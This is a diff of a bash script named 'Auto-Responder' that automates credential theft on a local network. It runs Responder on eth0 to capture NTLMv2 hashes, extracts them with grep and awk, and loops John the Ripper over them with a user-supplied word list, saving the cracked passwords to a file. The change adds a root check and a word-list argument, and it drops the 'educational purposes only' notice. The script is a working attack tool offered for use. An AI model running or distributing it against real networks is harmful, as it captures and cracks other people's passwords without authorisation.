@@ -1,13 +1,25 @@
 #!/bin/bash
-unbuffer responder -I eth0 -dw -v >>  hash &
-echo "Auto-Responder is meant for educational purposes only. Please use it responsibly."
-echo 
-sleep 4
+root=$(whoami)
+if [[ $root == "root" ]] ; then
+figlet "Auto-Responder"
+word_list=$1
+if [[ -z $1 ]] ; then 
+echo " 
+To use the tool, please select a word list
+ Example: Auto-Responder  <Word List>
+"
+exit
+fi
+unbuffer responder -I eth0 -dw -v >  hash &
 echo "cracked passwords will be saved to (final_crack)"
 while true ;do
 sleep 4
-cat hash | grep "NTLMv2 Hash" | awk  '{print $5}' >> .hash 
+cat hash | grep "Hash" | awk  '{print $5}' >> .hash 
 sed -r "s/\x1B\[[0-9;]*[mK]//g" .hash >> .clean_hashes.txt
-john --format=netntlmv2  .clean_hashes.txt 2>/dev/null | grep -v Loaded | grep -v No | grep -v Remaining >> .Cracked_passwords
+john --format=netntlmv2  --wordlist=$1 .clean_hashes.txt 2>/dev/null | grep -v Loaded | grep -v No | grep -v Remaining >> .Cracked_passwords
 cat .Cracked_passwords | sort -u > finle_crack
 done
+else
+echo "plase run Auto-Responder as root"
+exit
+fi
